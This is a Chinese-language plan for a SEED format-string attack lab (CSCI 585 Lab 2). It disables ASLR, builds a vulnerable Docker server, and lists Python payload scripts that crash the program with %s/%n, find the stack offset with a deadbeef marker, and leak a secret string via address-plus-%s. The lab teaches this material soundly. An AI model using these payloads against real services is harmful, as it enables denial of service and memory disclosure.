# CSCI 585 – Lab 2 作业完成计划（Format String Attack Lab）

> 依据：`lab2.pdf`（Due on Sep 25）
> 分值：Task 1 = 50 分，Task 2 = 50 分，共 100 分
> 提交物：一份**带截图的详细实验报告**（说明做了什么、观察到什么、解释有趣/意外的现象，并附关键代码片段 + 解释；只贴代码不解释不得分）
> 本计划中的命令、脚本、预期输出均基于作业 PDF 与官方 Labsetup 源码（`docker-compose.yml`、`server-code/Makefile`、`format.c`）核对。

---

## 0. 作业概述与硬性约束

| 项目       | 内容                                                                                                                                                                   |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 攻击目标   | 服务器上的`format` 程序中 `myprintf(char *msg)` 里的 `printf(msg)`（CWE-134：外部可控格式字符串）                                                                |
| 目标服务器 | **10.9.0.5:9090**（32 位程序；Apple Silicon 机器两个容器都是 64 位，任选其一）                                                                                   |
| 输入上限   | **1500 字节**（`format.c` 中 `char buf[1500]`，`fread` 最多读 1500）                                                                                       |
| 关键限制   | 攻击结果（打印出的内存数据）**只出现在 server 容器的控制台**，攻击者用 `nc` 是看不到的 → 所有"读内存"截图必须截**容器日志窗口**                         |
| 成功判据   | `myprintf()` 正常返回会打印 `Returned properly` 和笑脸；**看不到笑脸 = 程序已崩溃**（崩溃的是 server 派生的子进程，server 本身不会挂）                       |
| 地址信息   | server 每次连接都会打印`Input buffer 地址 / secret 地址 / target 地址 / Frame Pointer`，这些地址**容器不重启就不变**（这是 server 内置的随机性，与 ASLR 无关） |

**目录/环境约定**（下文命令均以此为前提）：

```
Labsetup/
├── docker-compose.yml
├── server-code/      ← Makefile, format.c, server.c（make 在这里执行）
├── fmt-containers/   ← Dockerfile-32 / Dockerfile-64，make install 会把二进制拷进来
└── attack-code/      ← build_string.py（官方示例：演示如何把二进制数据塞进字符串）
```

两个容器（来自 `docker-compose.yml`）：

| 容器名              | IP       | 架构                              |
| ------------------- | -------- | --------------------------------- |
| `server-10.9.0.5` | 10.9.0.5 | 32 位（**本作业统一用它**） |
| `server-10.9.0.6` | 10.9.0.6 | 64 位（本作业不使用）             |

---

## 1. 环境设置（对应截图 S1–S4）

### 1.1 前置条件检查

```bash
# 需要：SEED Ubuntu 20.04 VM（下载页 https://seedsecuritylabs.org/labsetup.html）
# 若已有普通 Linux + Docker 也可，步骤相同（建议优先用 SEED VM，别名 dcbuild/dcup/dockps/docksh 都在 .bashrc 里）
docker --version
docker-compose --version
python3 --version
nc -h | head -1          # netcat
```

### 1.2 关闭地址随机化（ASLR）

```bash
sudo sysctl -w kernel.randomize_va_space=0
cat /proc/sys/kernel/randomize_va_space
```

**预期结果**：第二条命令输出 `0`。
**📸 截图 S1**：两条命令连同输出（能同时看到 `0`）。

### 1.3 下载并解压 Labsetup.zip

```bash
# 注意：不要解压到共享目录（共享文件夹会有权限/执行问题），放到家目录
cd ~
wget https://seedsecuritylabs.org/Labs_20.04/Files/Format_String/Labsetup.zip
unzip Labsetup.zip
cd Labsetup
ls -R . | head -30       # 应能看到 docker-compose.yml, server-code/, fmt-containers/, attack-code/
```

**📸 截图 S2**：`ls` 输出，显示上述目录结构。

### 1.4 编译 vulnerable 程序

```bash
cd ~/Labsetup/server-code
make
make install
ls ../fmt-containers      # 应看到 server, format-32, format-64 已拷入
```

**预期结果**：编译过程中**必然出现**如下警告（这是 gcc 对格式字符串漏洞的防护，先忽略，报告里要解释它）：

```
format.c: In function 'myprintf':
format.c:33:5: warning: format not a string literal and no format arguments
                         [-Wformat-security]
   33 |     printf(msg);
      |     ^~~~~~~~~~~
```

编译选项说明（写报告可用）：`-z execstack` 允许栈可执行（为注入 shellcode 铺路）；32 位用 `-static -m32`（容器里没有 32 位动态库）；`L`（`BUF_SIZE`）决定 `dummy_function()` 里栈帧大小，**会直接改变栈布局 → 决定后面 Task 2.A 的偏移量 N**，所以 N 必须自己实测。

**📸 截图 S3**：`make` 输出（含上述警告）+ `make install` + `ls ../fmt-containers`。

### 1.5 构建并启动容器

```bash
cd ~/Labsetup
docker-compose build      # 别名: dcbuild
docker-compose up         # 别名: dcup；保持这个终端开着，所有攻击结果都在这里看
```

另开一个终端查看容器列表：

```bash
docker ps --format "{{.ID}} {{.Names}}"    # 别名: dockps
```

**预期结果**：

```
xxxxxxxxxxxx server-10.9.0.5
xxxxxxxxxxxx server-10.9.0.6
```

> 也可以用 `docker-compose up -d` 后台运行，再用 `docker logs -f server-10.9.0.5` 单独看日志（截图用这个更清晰，且**没有** `server-10.9.0.5 | ` 前缀，方便脚本解析）。

**📸 截图 S4**：`docker-compose up` 正常启动 + `dockps` 显示两个容器。

### 1.6 基线连通性测试（同时记录关键地址）

```bash
echo hello | nc 10.9.0.5 9090
# 若不退出按 Ctrl+C
```

**预期结果**（容器控制台，具体地址与你不同）：

```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | Input buffer (address):        0xffffd2d0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Input size: 6
server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.5 | The target variable's value (after): 0x11223344
```

**必做**：把 `Input buffer (address)`、`The secret message's address`、`Frame Pointer` 三个值**记下来**（Task 2.B 要用 secret 地址）。
**📸 截图 S5 上半部分**：完整基线输出（含笑脸）。

### 1.7 阅读官方示例代码

```bash
cat ~/Labsetup/attack-code/build_string.py
```

这是官方给的"如何把二进制数放进字符串"的示例，Task 2.B 直接照它的写法。

---

## 2. Task 1：崩溃程序（50 分，📸 截图 S5–S6）

### 2.1 步骤

1. 写 payload 生成脚本 `task1_crash.py`（放在 `~/Labsetup/attack-code/` 下）。
2. 生成 `crash_payload`，发送给 10.9.0.5:9090。
3. 在**容器控制台**确认没有出现 `Returned properly` 笑脸。

### 2.2 运行的代码

```python
#!/usr/bin/env python3
# task1_crash.py —— 让 myprintf() 崩溃
# 原理: 大量 %s 让 printf 把栈上的垃圾值当作指针去解引用, 一旦指向非法地址 → 段错误
payload = ("%s" * 200).encode()      # 200 字节, 远小于 1500 上限
open("crash_payload", "wb").write(payload)
print("payload size:", len(payload))
```

```bash
cd ~/Labsetup/attack-code
python3 task1_crash.py
cat crash_payload | nc 10.9.0.5 9090
# 若 nc 不退出, 按 Ctrl+C
```

### 2.3 应该得到的结果

容器控制台**只**出现到：

```
server-10.9.0.5 | Input size: 200
server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

**之后没有** `(ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)`，也没有 `target value (after)` —— 这就说明 format 子进程崩了（有的环境还会看到 `Segmentation fault` 字样）。server 本体继续运行，可以马上再发下一个 payload。

**备选方案**（若 `%s`×200 未崩溃，例如栈上恰好全是合法指针）：

```python
payload = ("%n" * 100).encode()      # %n 把已打印字符数写入栈上垃圾地址 → 写非法内存必崩
```

### 2.4 截图与报告要点

- **📸 截图 S6**：左边/上边是 Task 1 的 payload 与发送命令，右边/下边是控制台输出（**与 S5 的 hello 成功输出对比**，突出"笑脸消失"）。
- **报告解释**：为什么会崩（`printf(msg)` 把用户输入当格式串，`%s` 解引用任意栈值）；对应 CWE-134；破坏的是 CIA 三性中的**可用性**（拒绝服务）；说明为什么 gcc 会给出 `-Wformat-security` 警告、它为什么能（部分）防住这类问题。

---

## 3. Task 2.A：打印栈数据、测定偏移 N（📸 截图 S7）

### 3.1 目标

回答作业问题：**"需要多少个 `%x` 格式符，才能让 server 打印出你输入的前 4 个字节？"** 这个数 N 是 Task 2.B 的前提，必须准确。

### 3.2 原理

- 格式串本身（`buf`）就在栈上；printf 的参数指针从 `myprintf` 的参数区开始**逐个字（32 位 = 4 字节）向高地址走**，走过 `dummy_function` 的栈帧、`main` 的栈帧，最终会走到 `buf`。
- 在 `buf[0:4]` 放一个唯一标记 `0xdeadbeef`，后面接一串 `%.8x.`。第 N 个 `%.8x` 恰好把标记当数值打印出来时，N 就是答案。
- `0xdeadbeef` 小端存放为 `ef be ad de`，不含 `\x00`、`.`、`%`，安全。

### 3.3 运行的代码

```python
#!/usr/bin/env python3
# task2a_probe.py —— 测偏移 N
MARKER = 0xdeadbeef
N_SPEC = 250                                # 250 组, 覆盖 250 个字 = 1000 字节栈范围
payload  = (MARKER).to_bytes(4, byteorder='little')   # buf[0:4] = 标记
payload += ("%.8x." * N_SPEC).encode('latin-1')       # 4 + 1250 = 1254 <= 1500
open("probe_payload", "wb").write(payload)
print("payload size:", len(payload))
```

```python
#!/usr/bin/env python3
# find_offset.py —— 从容器日志里自动数出 N
import subprocess
out = subprocess.run(["docker", "logs", "server-10.9.0.5"],
                     capture_output=True, text=True, errors="replace").stdout
n = None
for line in reversed(out.splitlines()):          # 取最近一次运行
    if "deadbeef" in line:
        head = line.split("deadbeef")[0]         # 标记出现之前的输出
        n = head.count(".") + 1                  # 每个 %.8x 组以 '.' 结尾 → 组数+1 = 第 N 个
        break
if n is None:
    print("未找到 deadbeef, 请增大 N_SPEC 或检查 payload 是否发送成功")
else:
    print("N (需要的 %x 格式符个数) =", n)
```

```bash
cd ~/Labsetup/attack-code
python3 task2a_probe.py
cat probe_payload | nc 10.9.0.5 9090      # Ctrl+C 结束
python3 find_offset.py
```

### 3.4 应该得到的结果

- 控制台输出一大串 `00000000.00000000....`，其中某处出现 **`deadbeef`**（它是被第 N 个 `%.8x` 打印出来的）。
- `find_offset.py` 打印 `N = xx`。**参考量级**：公开的同类实验报告中 N 在 24～64 之间；**你的值取决于本课程 Labsetup 的 `L`（`BUF_SIZE`）**，必须以实测为准，不能照抄别人。
- **验证 N 是否可靠**：容器不重启，N 恒定；若 `deadbeef` 没出现（N > 250），把 `N_SPEC` 调大（`4 + 5*N_SPEC ≤ 1500` → 最多可到 299 组）再测。
- 用手工方式核对一遍：`docker logs server-10.9.0.5 2>&1 | grep -o deadbeef` 能找到，且自己数到的组数与脚本一致。

**📸 截图 S7**：probe 发送命令 + 控制台中 `deadbeef` 所在片段 + `find_offset.py` 打印的 N。

### 3.5 报告要点

- 解释栈布局：`myprintf` 帧 → `dummy_function` 帧（大小 = `BUF_SIZE`）→ `main` 帧（`buf` 在其中），参数指针为何会"走进"用户输入。
- 回答作业问题原文："How many %x format specifiers do you need…?" → 写出你测得的 N 并附截图。

---

## 4. Task 2.B：打印堆上的 secret 消息（📸 截图 S8）

### 4.1 目标

让 server 打印出 secret 字符串（基线打印里显示其地址，如 `0x080b4008`）的内容。预期内容为 `A secret message`（以你容器实际打印为准）。

### 4.2 原理

1. 把 secret 地址按**小端序**写进 `buf[0:4]`（与 2.A 标记位置完全一致）。
2. 前 `N-1` 个 `%.8x.` 把参数指针推进到 `buf[0:4]` 所在的那个字。
3. 第 N 个格式符用 `%s` → printf 把 `buf[0:4]` 的值（=secret 地址）当指针解引用，打印出该地址处的字符串。

### 4.3 运行的代码

```python
#!/usr/bin/env python3
# task2b_leak.py —— 泄露 secret 消息
# 用法: python3 task2b_leak.py <secret地址, 如0x080b4008> <Task2.A 测得的 N>
import sys

if len(sys.argv) != 3:
    print("用法: python3 task2b_leak.py 0x080b4008 <N>"); sys.exit(1)

secret_addr = int(sys.argv[1], 16)
N = int(sys.argv[2])

addr_bytes = secret_addr.to_bytes(4, byteorder='little')   # 小端: 低字节在前
# 坏字节检查: \x00 会让 printf 提前终止; % 会被当成格式符
if b'\x00' in addr_bytes or b'%' in addr_bytes:
    print("地址字节含 \\x00 或 %, 无法直接使用: %r" % addr_bytes)
    print("处理: docker-compose down && docker-compose up 重启容器换地址后重试")
    sys.exit(1)

payload  = addr_bytes                                   # buf[0:4] = secret 地址
payload += ("%.8x." * (N - 1)).encode('latin-1')        # 前 N-1 个格式符
payload += b"%s"                                        # 第 N 个格式符: 解引用
assert len(payload) <= 1500, "payload 超过 1500 字节"
open("leak_payload", "wb").write(payload)
print("payload size:", len(payload), " addr bytes:", addr_bytes.hex())
```

```bash
cd ~/Labsetup/attack-code
# secret 地址取自 1.6 基线测试时容器打印的 "The secret message's address"
python3 task2b_leak.py 0x080b4008 你的N值
cat leak_payload | nc 10.9.0.5 9090
```

### 4.4 应该得到的结果

容器控制台依次出现：

```
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | <地址原始4字节的乱码><一串8位hex>.<一串8位hex>....A secret message
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)          ← 正常返回, 没崩
server-10.9.0.5 | The target variable's value (after): 0x11223344
```

判定成功的三个标志：

1. hex dump 之后出现了 **`A secret message`**（或你容器里 secret 的实际文本）；
2. **笑脸出现**（说明 `%s` 没有解引用到非法地址，即地址和 N 都对）；
3. `target value (after)` 仍是 `0x11223344`（本任务只读不写）。

**📸 截图 S8**：脚本 + 发送命令 + 控制台中打印出 `A secret message` 的完整片段（包含笑脸）。

### 4.5 失败排查

| 现象                             | 原因与处理                                                                                       |
| -------------------------------- | ------------------------------------------------------------------------------------------------ |
| 输出里没有 secret，但有笑脸      | N 不对 → 重做 2.A；或 secret 地址取错                                                           |
| 输出被截断 / 只有前半截          | 地址含`\x00` → 脚本已检测；重启容器换地址（`dcdown && dcup`），重新记录地址                 |
| 输出是乱码格式符、无笑脸（崩溃） | 地址含`%`，或地址记错 → 同上重启换地址                                                        |
| secret 地址变了                  | 地址只在**容器重启**时变；重启后必须重新做基线测试记录新地址（N 通常不变，但建议复测一次） |

---

## 5. 截图清单（报告用，按顺序编号）

| 编号 | 内容                                                                                     | 证明点                  |
| ---- | ---------------------------------------------------------------------------------------- | ----------------------- |
| S1   | `sysctl` 关闭 ASLR + `cat /proc/sys/kernel/randomize_va_space` = 0                   | 对抗措施已关闭          |
| S2   | Labsetup 解压后的目录结构`ls`                                                          | 环境搭建正确            |
| S3   | `make` 输出（含 `-Wformat-security` 警告）+ `make install` + `ls fmt-containers` | 编译成功、识别 gcc 防护 |
| S4   | `docker-compose up` 启动 + `dockps` 两个容器                                         | 服务就绪                |
| S5   | `echo hello \| nc 10.9.0.5 9090` 完整基线输出（含三个地址和笑脸）                       | 正常行为 + 记录地址     |
| S6   | Task 1：payload 生成/发送 + 控制台**无笑脸**（与 S5 对比）                         | 崩溃成功（50 分）       |
| S7   | Task 2.A：probe 输出中`deadbeef` 片段 + `find_offset.py` 打印的 N                    | 测得偏移 N              |
| S8   | Task 2.B：控制台打印出`A secret message` 且笑脸正常                                    | 读内存成功（50 分）     |

---

## 6. 报告撰写指引

每个 Task 按固定结构写：

1. **目的**（一句话）
2. **关键代码**（贴 Python 脚本，逐段解释：为什么小端、为什么是 N-1 个 `%.8x` 再接 `%s`）
3. **执行命令与截图**
4. **观察到的结果 + 解释**

必须覆盖的讨论点（作业 PDF 前言明确提出）：

- **CWE-134**（Use of Externally-Controlled Format String）如何体现，为什么 `printf(msg)` 是错的、`printf("%s", msg)` 就是修复；
- 对 **CIA 三性**的影响：Task 1 → 可用性（DoS）；Task 2 → 保密性（任意读）；（若提及还可写完整性/代码执行）
- **gcc 的 `-Wformat-security` 警告**含义、能否完全防御（提示：它只在编译期提示，且只防"无参数的非常量格式串"）；
- **ASLR** 为什么必须关（地址猜测难度），关掉后实验结果是否可复现；
- **`-z execstack`** 与不可执行栈：本实验只做到"读内存"，但注入代码需要可执行栈，说明这一防护与绕过思路（ret2libc）。
- 有趣的观察示例：容器自带的"随机性"与 ASLR 的区别；`%.8x` 能一路"走"进自己输入的原因；`%s`/`%n` 只差一个字母却一个是读一个是写。

---

## 7. 排错与注意事项

1. **所有结果都在容器控制台**：`nc` 端只能看到连接建立与否；截图务必截 `docker-compose up` 的终端（或 `docker logs`）。
2. **`nc` 不退出是正常的**：按 `Ctrl+C` 即可；或 `timeout 5 cat payload | nc 10.9.0.5 9090`。
3. **偏移 N 绝对不能抄**：`format.c` 的 `dummy_function(char*)` + `BUF_SIZE(L)` 会在 `main` 和 `myprintf` 之间插入一段栈帧，L 不同 N 就不同（官方 Makefile 注释：L 建议 10–400，教师每年会改）。
4. **坏字节是头号坑**：地址里出现 `\x00`（printf 截断）或 `%`（被当格式符）→ 重启容器换地址；小端写入顺序 `低字节在前`。
5. **payload 不能超过 1500 字节**，所有生成脚本都已 `assert` 检查。
6. **改了源码要重建容器**：`make && make install && docker-compose build && docker-compose up`（Dockerfile 是 `COPY` 二进制，不重建不生效）。
7. **崩溃不影响 server**：崩的是子进程，可连续测试；但若 `nc` 连不上，先 `dockps` 确认容器还在。
8. **64 位容器（10.9.0.6）差异**（本作业用不到，备用）：地址 8 字节、标记用 8 字节（`0xdeadbeefcafebabe`）、格式符用 `%p` 或 `%.16x.`、判定按 8 字节对齐；Apple Silicon 学生才需要。

---

## 8. 执行顺序与时间估算（检查清单）

- [ ] **环境（约 45–60 分钟）**：1.2 关 ASLR → 1.3 解压 → 1.4 编译 → 1.5 起容器 → 1.6 基线测试并记地址 → 截图 S1–S5
- [ ] **Task 1（约 15 分钟）**：跑 `task1_crash.py`，确认无笑脸 → 截图 S6
- [ ] **Task 2.A（约 30 分钟）**：跑 `task2a_probe.py` + `find_offset.py`，记下 N → 截图 S7
- [ ] **Task 2.B（约 30 分钟）**：用基线 secret 地址 + N 跑 `task2b_leak.py`，看到 `A secret message` → 截图 S8
- [ ] **报告（约 60–90 分钟）**：按第 6 节结构整理代码、截图、解释，重点写清楚 CWE-134 / CIA / 编译警告 / ASLR 的讨论

---

## 附录：三个脚本速查

| 脚本                | 作用                                      | 输入                   | 输出              |
| ------------------- | ----------------------------------------- | ---------------------- | ----------------- |
| `task1_crash.py`  | 生成崩溃 payload（200×`%s`）           | 无                     | `crash_payload` |
| `task2a_probe.py` | 生成探测 payload（标记 + 250×`%.8x.`） | 无                     | `probe_payload` |
| `find_offset.py`  | 从`docker logs` 数出偏移 N              | 容器在跑               | 打印`N = xx`    |
| `task2b_leak.py`  | 生成泄露 payload                          | `0xsecret地址` `N` | `leak_payload`  |

发送统一用：`cat <payload文件> | nc 10.9.0.5 9090`（不退出按 Ctrl+C）。
